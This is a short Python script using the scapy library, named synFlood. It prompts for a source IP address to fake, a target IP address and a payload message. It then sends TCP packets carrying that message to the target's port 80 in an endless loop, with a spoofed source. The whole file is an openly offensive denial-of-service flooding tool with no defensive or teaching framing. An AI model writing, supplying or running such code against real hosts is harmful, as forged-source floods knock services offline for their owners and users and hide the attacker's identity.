#!/usr/bin/python

from scapy.all import *

def synFlood(src, tgt, message):
	dport = 80
	IP_layer = IP(src=src, dst=tgt)
	TCP_layer = TCP(sport=4444, dport=dport)
	RAW_layer = Raw(load=message)
	pkt = IP_layer/TCP_layer/RAW_layer
	send(pkt)

source = raw_input("[*] Enter Source IP Address To Fake: ")
target = raw_input("[*] Enter Targets IP Address: ")
message = raw_input("[*] Enter The Message For TCP Payload: ")

while True:
	synFlood(source, target, message) 
